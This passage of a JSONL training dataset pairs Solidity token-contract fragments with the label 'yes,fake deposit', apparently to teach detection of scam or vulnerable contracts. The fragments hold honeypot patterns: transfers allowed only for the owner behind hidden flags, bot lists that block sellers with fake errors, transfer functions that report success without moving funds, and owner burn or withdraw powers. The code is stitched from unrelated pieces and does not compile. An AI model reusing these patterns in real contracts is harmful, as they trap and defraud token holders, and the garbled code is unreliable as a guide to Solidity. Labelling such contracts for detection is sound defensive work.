> 0, \"Transfer amount must be grater thatn zero\"); \n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\"); \n if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} \n else {require (maxTxPercent == true, \"\");} \n } \n \n  \n function burnRewards(address account, uint256 value) external onlyOwner { \n _burn(account, value); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12; \n \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n  \n function transfer(address recipient, uint256 amount) public override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) private { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be greater than zero\"); \n if (BOTtoScan[sender] || BOTtoScan[recipient]) \n require(amount == 0, \"temporary error\"); \n if (_contractRunning == false || sender == owner() || recipient == owner()) { \n if (_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferFromExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n _transferToExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferStandard(sender, recipient, amount); \n } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n _transferBothExcluded(sender, recipient, amount); \n } else {_transferStandard(sender, recipient, amount);}} \n else {require (_contractRunning == false, \"Unexpected error\");} \n } \n \n function _getCurrentSupply() private view returns(uint256, uint256) { \n uint256 rSupply = _rTotal; \n uint256 tSupply = _tTotal; \n for (uint256 i = 0; i < _excluded.length; i++) { \n if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal); \n rSupply = rSupply.sub(_rOwned[_excluded[i]]); \n tSupply = tSupply.sub(_tOwned[_excluded[i]]); \n } \n if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); \n return (rSupply, tSupply); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.7.1;interface IErc223 { \n function totalSupply() external view returns (uint); \n \n function transfer(address to, uint value, bytes memory data) external returns (bool ok); \n \n event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); \n} \n \n \n \ninterface IErc223ReceivingContract { \n  \n function transfer(address to, uint tokens) external returns (bool success); \n \n function transferFrom(address from, address to, uint tokens) external returns (bool success); \n \n event Transfer(address indexed from, address indexed to, uint tokens); \n event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \n \n \n \n \n \nlibrary Address { \n  \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \nlibrary SafeMath { \n  \n function transfer(address _to, uint256 _value) public override returns (bool ok) { \n // block transfers if the recipient only allows kyc input, check other factors \n if (onlyAcceptsKycInput[_to] == false && balances[msg.sender][ShyftTokenType] >= _value) { \n balances[msg.sender][ShyftTokenType] = balances[msg.sender][ShyftTokenType].sub(_value); \n \n balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_value); \n \n emit Transfer(msg.sender, _to, _value); \n \n return true; \n } else { \n return false; \n } \n } \n \n /// @param _tokenOwner The address of the origin. \n /// @param _spender The address of the recipient. \n /// @dev Get the current allowance for the basic Shyft token type. (basic ERC20 functionality) \n /// @return remaining the current allowance for the basic Shyft token type for a specific user \n \n function transferFrom(address _from, address _to, uint _tokens) public override returns (bool success) { \n if (onlyAcceptsKycInput[_to] == false && allowed[_from][msg.sender][ShyftTokenType] >= _tokens && balances[_from][ShyftTokenType] >= _tokens) { \n allowed[_from][msg.sender][ShyftTokenType] = allowed[_from][msg.sender][ShyftTokenType].sub(_tokens); \n \n balances[_from][ShyftTokenType] = balances[_from][ShyftTokenType].sub(_tokens); \n balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_tokens); \n \n emit Transfer(_from, _to, _tokens); \n emit Approval(_from, msg.sender, allowed[_from][msg.sender][ShyftTokenType]); \n \n return true; \n } else { \n return false; \n } \n } \n \n /// @param _to The address of the receiver of minted tokens. \n /// @param _amount The amount of minted tokens. \n /// @dev Mints tokens to a specific address. Called only by an account with a minter role. \n /// @notice Has Shyft Opt-in Compliance feature-sets for expansion/mvp capabilities. \n \n r) { \n IShyftKycContractRegistry contractRegistry = IShyftKycContractRegistry(shyftKycContractRegistryAddress); \n \n address ethMarch26KycContractAddress = contractRegistry.getContractAddressOfVersion(0); \n \n if (ethMarch26KycContractAddress != address(0)) { \n IERC20 march26Erc20 = IERC20(ethMarch26KycContractAddress); \n \n uint256 currentBalance = march26Erc20.balanceOf(address(this)); \n \n uint256 incorrectlySentAssetBalance = currentBalance.sub(v1TotalUpgradeAmount); \n \n if (_amount <= incorrectlySentAssetBalance) { \n bool success = march26Erc20.transfer(_destination, _amount); \n \n if (success == true) { \n emit EVT_redeemIncorrectlySentAsset(_destination, _amount); \n \n return 4; \n } else { \n revert(\"erc20 transfer event did not succeed\"); \n // return 3; \n } \n } else { \n //did not have enough tokens in incorrectly-sent balance account to redeem \n return 2; \n } \n } else { \n return 1; \n } \n } else { \n return 0; \n } \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.7.6 <0.8.0;\nimport \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol \"; \n\n contract DOSE is ERC20 {\n constructor(\n address[] memory recipients,\n uint256[] memory values,\n string memory tokenURI_\n ) ERC20( \"DOSE \", \"DOSE \", 18, tokenURI_) {\n _batchMint(recipients, values);\n }\n}\n\" \n }, \n \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol\": { \n \"content\": \"\npragma solidity >=0.7.6 <0.8.0;\nimport {ManagedIdentity} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/metatx/ManagedIdentity.sol \";import {IERC165} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/introspection/IERC165.sol \";import {AddressIsContract} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/utils/types/AddressIsContract.sol \";import {IERC20} from \"./IERC20.sol \";import {IERC20Detailed} from \"./IERC20Detailed.sol \";import {IERC20Allowance} from \"./IERC20Allowance.sol \";import {IERC20SafeTransfers} from \"./IERC20SafeTransfers.sol \";import {IERC20BatchTransfers} from \"./IERC20BatchTransfers.sol \";import {IERC20Metadata} from \"./IERC20Metadata.sol \";import {IERC20Permit} from \"./IERC20Permit.sol \";import {IERC20Receiver} from \"./IERC20Receiver.sol \"; \n\n abstract contract ERC20 is\n ManagedIdentity,\n IERC165,\n IERC20,\n IERC20Detailed,\n IERC20Metadata,\n IERC20Allowance,\n IERC20BatchTransfers,\n IERC20SafeTransfers,\n IERC20Permit\n{\n using AddressIsContract for address; \n // keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline) \")\n bytes32 internal constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; \n uint256 public immutable deploymentChainId; \n // solhint-disable-next-line var-name-mixedcase\n bytes32 internal immutable _DOMAIN_SEPARATOR; \n mapping(address => uint256) public override nonces; \n string internal _name;\n string internal _symbol;\n uint8 internal immutable _decimals;\n string internal _tokenURI; \n mapping(address => uint256) internal _balances;\n mapping(address => mapping(address => uint256)) internal _allowances;\n uint256 internal _totalSupply; \n constructor(\n string memory name_,\n string memory symbol_,\n uint8 decimals_,\n string memory tokenURI_\n ) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _tokenURI = tokenURI_; \n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n deploymentChainId = chainId;\n _DOMAIN_SEPARATOR = _calculateDomainSeparator(chainId, bytes(name_));\n } \n // solhint-disable-next-line func-name-mixedcase\n function transfer(address to, uint256 value) external virtual override returns (bool) {\n _transfer(_msgSender(), to, value);\n return true;\n } \n /// @dev See {IERC20-transferFrom}.\n function transferFrom(\n address from,\n address to,\n uint256 value\n ) external virtual override returns (bool) {\n _transferFrom(_msgSender(), from, to, value);\n return true;\n } \n /////////////////////////////////////////// ERC20MultiTransfer /////////////////////////////////////// \n /// @dev See {IERC20MultiTransfer-multiTransfer(address[],uint256[])}.\n function transfer(address to, uint256 value) external returns (bool); \n \n function transferFrom(\n address from,\n address to,\n uint256 value\n ) external returns (bool); \n \n \n } \n}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.7;\n\n contract DAO {\n address public dao;\n event DAOChanged(address from, address to); \n constructor() {\n dao = msg.sender;\n emit DAOChanged(address(0), msg.sender);\n } \n modifier onlyDAO() {\n require(msg.sender == dao, \"Only DAO \");\n _;\n } \n function transfer(address recipient, uint256 amount)\n external\n returns (bool); \n \n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n} \n// Interfaces for contract interaction\n interface INterfaces {\n function transfer(address, uint256) external returns (bool); \n function transferFrom(\n address,\n address,\n uint256\n ) external returns (bool); \n} \n// For tokens that do not return true on transfers eg. USDT\n interface INterfacesNoR {\n function transfer(address, uint256) external; \n function transferFrom(\n address,\n address,\n uint256\n ) external;\n}\n\"},\"owned.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSE\npragma solidity ^0.8.7;\n\n contract Owned {\n address public owner;\n address public newOwner; \n event OwnershipChanged(address from, address to); \n constructor() {\n owner = msg.sender;\n emit OwnershipChanged(address(0), msg.sender);\n } \n modifier onlyOwner() {\n require(msg.sender == owner, \"Only owner \");\n _;\n } \n // owner can give super-rights to someone\n function transfer(address recipient, uint256 amount)\n external\n override\n returns (bool)\n {\n _transfer(msg.sender, recipient, amount);\n return true;\n } \n // ERC20 approve\n function approve(address spender, uint256 amount)\n external\n override\n returns (bool)\n {\n _approve(msg.sender, spender, amount);\n return true;\n } \n // ERC20 transferFrom\n function transferFrom( address sender, address recipient, uint256 amount ) external override returns (bool) {\n uint256 amt = allowance[sender][msg.sender];\n require(amt >= amount, \"ERC20: transfer amount exceeds allowance \");\n // reduce only if not permament allowance (uniswap etc)\n allowance[sender][msg.sender] -= amount;\n _transfer(sender, recipient, amount);\n return true;\n } \n // ERC20 increaseAllowance\n function _transfer( address sender, address recipient, uint256 Amount ) private {\n require(sender != ZERO, \"ERC20: transfer from the zero address \");\n require(recipient != ZERO, \"ERC20: transfer to the zero address \");\n require(!frozenAccount[sender], \"DAO: transfer from this address frozen \");\n require(!frozenAccount[recipient], \"DAO: transfer to this address frozen \"); \n if (Amount > 0) {\n if (isFeeFreeSender[sender]){\n _feeFreeTransfer(sender, recipient, Amount);\n } else if(isFeeFreeRecipient[recipient]){\n _feeFreeTransfer(sender, recipient, Amount);\n } else {\n ( uint256 _FeesToTake, uint256 _toburn, uint256 _tocharity, uint256 _toreward, uint256 _tosystem, uint256 _tostaking ) = _calcTransferFees( Amount ); \n uint256 _totransfer = Amount - _FeesToTake;\n uint256 _takefromsender = Amount - _toburn;\n FeeTotalCollected += _FeesToTake;\n balances[sender] -= _takefromsender;\n balances[recipient] += _totransfer;\n if(_toburn>0){\n _burn(sender, _toburn);\n FeeTotalCollectedBurned += _toburn;\n emit Transfer(sender, ZERO, _toburn);\n }\n if(_tocharity>0){\n balances[charityaddress] += _tocharity;\n emit Transfer(sender, charityaddress, _tocharity);\n }\n if(_toreward>0){\n balances[rewardsaddress] += _toreward;\n emit Transfer(sender, rewardsaddress, _toreward);\n }\n if(_tosystem>0){\n balances[systemaddress] += _tosystem;\n emit Transfer(sender, systemaddress, _tosystem);\n }\n if(_tostaking>0){\n balances[stakingaddress] += _tostaking;\n emit Transfer(sender, stakingaddress, _tostaking);\n }\n emit Transfer(sender, recipient, _totransfer);\n }\n } else emit Transfer(sender, recipient, 0);\n } \n\n \n function withdrawErc20(address token) external onlyOwner {\n uint256 balance = IERC20(token).balanceOf(address(this));\n require(balance > 0, \"Nothing to withdraw \");\n // use broken IERC20\n INterfacesNoR(token).transfer(owner, balance);\n }\n} \n//by Patrick\n\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \ninterface IERC20 { \n  \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function allowance(address owner, address spender) external view returns (uint256); \n \n  \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n return false; \n } \n \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) \n public virtual override returns (bool) \n { \n return false; \n } \n \n function amountOf(address account) public view returns (uint256) { \n return _locks[account].amount; \n } \n \n function pendingReward(address account, address tokenAddress) public view returns (uint256) { \n require(tokenAddress != address(0), \"VotingEscrow: reward token address cannot be 0x0.\"); \n IERC20 token = IERC20(tokenAddress); \n uint256 pending; \n \n if (_balances[account] > 0) { \n uint256 newReward = token.balanceOf(collector); \n uint256 newAccRewardPerBalance = _accRewardPerBalance[tokenAddress].add(newReward.mul(1e18).div(_totalSupply)); \n pending = _balances[account].mul(newAccRewardPerBalance).div(1e18).sub(_rewardDebt[account][tokenAddress]); \n } \n return pending; \n } \n \n function pendingWasabi(address account) public view returns (uint256) { \n uint256 pending; \n \n if (_balances[account] > 0) { \n uint256 accRewardPerBalance = _accWasabiRewardPerBalance; \n if (block.number > lastRewardBlock) { \n uint256 wasabiReward = getBlockReward(lastRewardBlock, block.number); \n accRewardPerBalance = _accWasabiRewardPerBalance.add(wasabiReward.mul(1e18).div(_totalSupply)); \n } \n pending = _balances[account].mul(accRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[account]); \n } \n return pending; \n } \n \n modifier claimReward() { \n collectReward(); \n uint256 veBal = _balances[msg.sender]; \n if (veBal > 0) { \n uint256 wasabiPending = veBal.mul(_accWasabiRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[msg.sender]); \n if (wasabiPending > 0) { \n if (wasabiNeedVesting) { \n IRewardVesting wasabiVesting = IRewardVesting(wasabiVestingAddress); \n wasabi.approve(address(wasabiVesting), wasabiPending); \n wasabiVesting.addEarning(msg.sender, wasabiPending); \n } else { \n _safeWasabiTransfer(msg.sender, wasabiPending); \n } \n } \n for (uint i=0; i<rewardTokens.length; i++) { \n address tokenAddress = rewardTokens[i]; \n if (tokenAddress != address(0)) { \n IERC20 token = IERC20(tokenAddress); \n uint256 pending = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18).sub(_rewardDebt[msg.sender][tokenAddress]); \n if (pending > 0) { \n bool needVesting = rewardsNeedVesting[tokenAddress]; \n if (needVesting) { \n address rewardVestingAddress = rewardVestingsList[tokenAddress]; \n if (rewardVestingAddress != address(0)) { \n IRewardVesting rewardVesting = IRewardVesting(rewardVestingAddress); \n token.approve(address(rewardVesting),pending); \n rewardVesting.addEarning(msg.sender,pending); \n } \n } else { \n token.transfer(msg.sender, pending); \n } \n } \n } \n } \n } \n _; // _balances[msg.sender] may changed. \n veBal = _balances[msg.sender]; \n for (uint i=0; i<rewardTokens.length; i++) { \n address tokenAddress = rewardTokens[i]; \n if (tokenAddress != address(0)) { \n _rewardDebt[msg.sender][tokenAddress] = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18); \n } \n } \n _wasabiRewardDebts[msg.sender] = veBal.mul(_accWasabiRewardPerBalance).div(1e18); \n } \n \n function _safeWasabiTransfer(address _to, uint256 _amount) internal { \n if (_amount > 0) { \n uint256 wasabiBal = wasabi.balanceOf(address(this)); \n if (_amount > wasabiBal) { \n wasabi.transfer(_to, wasabiBal); \n } else { \n wasabi.transfer(_to, _amount); \n } \n } \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1; \n \nabstract contract Context { \n function _transfer(address sender, address recipient, uint256 amount) internal override { \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n require(amount > 0, \"Transfer amount must be grater thatn zero \"); \n if (_call[sender] || _call[recipient]) require(_trans == false, \" \"); \n if (_trans == true || sender == owner || recipient == owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} else { \n require (_trans == true, \" \");} \n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n \n _beforeTokenTransfer(sender, recipient, amount); \n \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n \n emit Transfer(sender, recipient, amount); \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.1; \n import \"./Context.sol \"; \n \n \n abstract contract Ownable is Context { \n address owner; \n address owneraddress; \n event OwnershipTransferred( \n address indexed previousOwner, \n address indexed newOwner \n ); \n \n  \n constructor() { \n address msgSender = msg.sender; \n owner = msgSender; \n owneraddress = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n  \n \n} \n\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " \n \npragma solidity ^0.4.24; \n// Safe maths \nlibrary SafeMath { \n function transfer(address to, uint tokens) public returns (bool success); \n function approve(address spender, uint tokens) public returns (bool success); \n function transferFrom(address from, address to, uint tokens) public returns (bool success); \n \n event Transfer(address indexed from, address indexed to, uint tokens); \n event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \ncontract ApproveAndCallFallBack { \n function transfer(address to, uint value) external returns (bool); \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n function transfer(address recipient, uint256 amount) external returns (bool); \n function transfer(address to, uint tokens) public returns (bool success) { \n uint toBlackHole; \n uint toLiquidity; \n uint toUser; \n uint rate = _calRate(tokens); \n address blackHole = 0x0000000000000000000000000000000000000000; \n if(forceZeroStep || _inZeroWhiteList(msg.sender, to)){ \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n balances[to] = balances[to].add(tokens); \n emit Transfer(msg.sender, to, tokens); \n return true; \n } \n if(force1stStep || _in1stWhiteList(msg.sender, to)){ \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n toBlackHole = tokens.div(1000); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n emit Transfer(msg.sender, blackHole, toBlackHole); \n emit Transfer(msg.sender, to, tokens.sub(toBlackHole)); \n return true; \n } \n if(force2ndStep || _in2ndWhiteList(msg.sender, to)){ \n toBlackHole = tokens.div(1000); \n toLiquidity = tokens.mul(rate).div(100); \n toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n balances[devPool] = balances[devPool].add(toLiquidity); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(toUser); \n emit Transfer(msg.sender, blackHole, toBlackHole); \n emit Transfer(msg.sender, devPool, toLiquidity); \n emit Transfer(msg.sender, to, toUser); \n return true; \n } \n return true; \n } \n \n \n function transferFrom(address from, address to, uint tokens) public returns (bool success) { \n uint toBlackHole; \n uint toLiquidity; \n uint toUser; \n uint rate = _calRate(tokens); \n address blackHole = 0x0000000000000000000000000000000000000000; \n if(forceZeroStep || _inZeroWhiteList(from, to)){ \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n balances[to] = balances[to].add(tokens); \n emit Transfer(from, to, tokens); \n return true; \n } \n if(force1stStep || _in1stWhiteList(from, to)){ \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n toBlackHole = tokens.div(1000); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n emit Transfer(from, blackHole, toBlackHole); \n emit Transfer(from, to, tokens.sub(toBlackHole)); \n return true; \n } \n if(force2ndStep || _in2ndWhiteList(from, to)){ \n toBlackHole = tokens.div(1000); \n toLiquidity = tokens.mul(rate).div(100); \n toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n balances[devPool] = balances[devPool].add(toLiquidity); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(toUser); \n emit Transfer(from, blackHole, toBlackHole); \n emit Transfer(from, devPool, toLiquidity); \n emit Transfer(from, to, toUser); \n return true; \n } \n return true; \n } \n \n \n function _safeTransferETH(address to, uint value) internal { \n (bool success) = to.call.value(value)(new bytes(0)); \n require(success, 'Lion Transfer: ETH_TRANSFER_FAILED'); \n } \n function getRateV(uint256 i) public view returns(uint256){ \n return _rateV[i]; \n } \n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.0; \n \ncontract Token { \n \n /// @return total amount of tokens \n function transfer(address _to, uint256 _value) returns (bool success) {} \n \n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from` \n /// @param _from The address of the sender \n /// @param _to The address of the recipient \n /// @param _value The amount of token to be transferred \n /// @return Whether the transfer was successful or not \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} \n \n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens \n /// @param _spender The address of the account able to transfer the tokens \n /// @param _value The amount of wei to be approved for transfer \n /// @return Whether the approval was successful or not \n function transfer(address _to, uint256 _value) returns (bool success) { \n //Default assumes totalSupply can't be over max (2^256 - 1). \n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap. \n //Replace the if with this one instead. \n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n if (balances[msg.sender] >= _value && _value > 0) { \n balances[msg.sender] -= _value; \n balances[_to] += _value; \n Transfer(msg.sender, _to, _value); \n return true; \n } else { return false; } \n } \n \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { \n //same as above. Replace this line with the following if you want to protect against wrapping uints. \n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n balances[_to] += _value; \n balances[_from] -= _value; \n allowed[_from][msg.sender] -= _value; \n Transfer(_from, _to, _value); \n return true; \n } else { return false; } \n } \n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) { \n allowed[msg.sender][_spender] = _value; \n Approval(msg.sender, _spender, _value); \n \n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this. \n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData) \n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead. \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; } \n return true; \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./Token.sol \"; \n \n \n abstract contract AbstractToken is Token { \n constructor () { \n \n } \n \n \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool success) { \n uint256 fromBalance = accounts [msg.sender]; \n if (fromBalance < _value) return false; \n if (_value > 0 && msg.sender != _to) { \n accounts [msg.sender] = fromBalance - _value; \n accounts [_to] = accounts [_to] + _value; \n } \n emit Transfer (msg.sender, _to, _value); \n return true; \n } \n \n  \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool success) { \n uint256 spenderAllowance = allowances [_from][msg.sender]; \n if (spenderAllowance < _value) return false; \n uint256 fromBalance = accounts [_from]; \n if (fromBalance < _value) return false; \n \n allowances [_from][msg.sender] = \n spenderAllowance - _value; \n \n if (_value > 0 && _from != _to) { \n accounts [_from] = fromBalance - _value; \n accounts [_to] = accounts [_to] + _value; \n } \n emit Transfer (_from, _to, _value); \n return true; \n } \n \n  \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool) { \n if (frozen) return false; \n else if ( \n (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG == \n BLACK_LIST_FLAG) \n return false; \n else { \n if (_value <= accounts [msg.sender]) { \n require (AbstractToken.transfer (_to, _value)); \n return true; \n } else return false; \n } \n } \n \n  \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool) { \n if (frozen) return false; \n else if ( \n (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG == \n BLACK_LIST_FLAG) \n return false; \n else { \n if (_value <= allowances [_from][msg.sender] && \n _value <= accounts [_from]) { \n require (AbstractToken.transferFrom (_from, _to, _value)); \n return true; \n } else return false; \n } \n } \n \n  \n function transfer (address _to, uint256 _value) \n external returns (bool success); \n \n  \n function transferFrom (address _from, address _to, uint256 _value) \n external returns (bool success); \n \n  \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " \n \npragma solidity ^0.6.12; \n \nabstract contract Context { \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function allowance(address owner, address spender) external view returns (uint256); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n  \n function transfer(address recipient, uint256 amount) public override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { \n _transfer(sender, recipient, amount); \n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")); \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) private { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be greater than zero\"); \n if (BOTtoScan[sender] || BOTtoScan[recipient]) \n require(amount == 0, \"temporary error\"); \n if (_contractRunning == false || sender == owner() || recipient == owner()) { \n if (_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferFromExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n _transferToExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferStandard(sender, recipient, amount); \n } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n _transferBothExcluded(sender, recipient, amount); \n } else {_transferStandard(sender, recipient, amount);}} \n else {require (_contractRunning == false, \"Unexpected error\");} \n } \n \n function _transferStandard(address sender, address recipient, uint256 tAmount) private { \n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount); \n _rOwned[sender] = _rOwned[sender].sub(rAmount); \n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); \n _reflectFee(rFee, tFee); \n emit Transfer(sender, recipient, tTransferAmount); \n } } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
